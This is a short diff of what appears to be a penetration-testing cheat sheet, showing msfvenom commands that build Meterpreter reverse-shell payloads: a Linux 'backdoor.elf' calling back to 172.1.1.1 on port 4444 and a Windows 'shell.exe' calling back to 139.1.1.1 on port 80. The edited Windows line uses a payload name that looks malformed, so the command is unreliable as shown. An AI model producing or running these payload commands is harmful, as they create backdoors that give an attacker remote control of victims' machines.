@@ -32,7 +32,7 @@ crontab -e
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.1.1.1 LPORT=4444 -f elf -o backdoor.elf
 
 
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=139.1.1.1 LPORT=80 -f exe -o ~/shell.exe
+msfvenom -p windows/meterpreter/reverse LHOST=139.1.1.1 LPORT=80 -f exe -o ~/shell.exe
 ```
 
 ```
